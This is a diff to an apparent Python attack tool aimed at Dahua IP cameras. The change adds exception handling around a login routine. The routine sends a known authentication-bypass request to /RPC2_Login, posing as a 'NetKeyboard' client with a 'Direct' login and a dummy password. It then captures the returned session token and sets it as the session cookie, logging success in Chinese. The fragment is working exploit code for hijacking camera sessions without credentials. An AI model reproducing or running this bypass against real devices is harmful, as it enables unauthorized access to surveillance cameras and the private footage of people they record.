@@ -33,18 +33,19 @@ class Dahua(object):
         url = self.addr+"/RPC2_Login"
         post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
                                                                    "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
-        r = self.session.post(url, json=post_json)
-        if r.status_code != 200:
-            logger.info(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
-            return False
-        r = r.json()
-        if 'True' in str(r):
-            self.token = r["session"]
-            logger.success(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
-            self.session.cookies["DWebClientSessionID"] = self.token
-            return self.token
-        else:
-            logger.info(f"[-] 大华摄像头 token 获取失败")
+        try:
+            r = self.session.post(url, json=post_json)
+            if r.status_code != 200:
+                logger.info(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
+                return False
+            r = r.json()
+            if 'True' in str(r):
+                self.token = r["session"]
+                logger.success(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
+                self.session.cookies["DWebClientSessionID"] = self.token
+                return self.token
+        except Exception as e:
+            logger.exception(f"[-] 大华摄像头 token 获取失败")
             return False
 
     async def run_v2(self, browser: Browser):
